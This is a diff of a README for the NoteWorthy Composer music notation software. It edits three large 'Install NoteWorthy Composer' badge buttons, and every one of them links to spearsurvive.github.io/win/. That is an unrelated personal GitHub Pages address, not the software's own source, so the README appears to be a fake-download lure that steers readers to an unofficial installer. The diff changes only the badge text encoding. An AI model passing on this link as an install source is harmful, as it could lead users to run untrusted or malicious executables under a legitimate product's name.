@@ -22,7 +22,7 @@
 
 <div align="center">
 
-[![⬇ Install NoteWorthy Composer](https://img.shields.io/badge/⬇_Install_NoteWorthy%20Composer-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
+[![⬇ Install NoteWorthy Composer](https://img.shields.io/badge/⬇_Install_NoteWorthy+Composer-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
 
 </div>
 
@@ -81,7 +81,7 @@ NoteWorthy Composer is a Windows music notation software for creating, recording
 
 <div align="center">
 
-[![⬇ Install NoteWorthy Composer](https://img.shields.io/badge/⬇_Install_NoteWorthy%20Composer-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
+[![⬇ Install NoteWorthy Composer](https://img.shields.io/badge/⬇_Install_NoteWorthy+Composer-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
 
 </div>
 
@@ -125,7 +125,7 @@ NoteWorthy Composer is a Windows music notation software for creating, recording
 
 <div align="center">
 
-[![⬇ Install NoteWorthy Composer](https://img.shields.io/badge/⬇_Install_NoteWorthy%20Composer-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
+[![⬇ Install NoteWorthy Composer](https://img.shields.io/badge/⬇_Install_NoteWorthy+Composer-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
 
 </div>
 
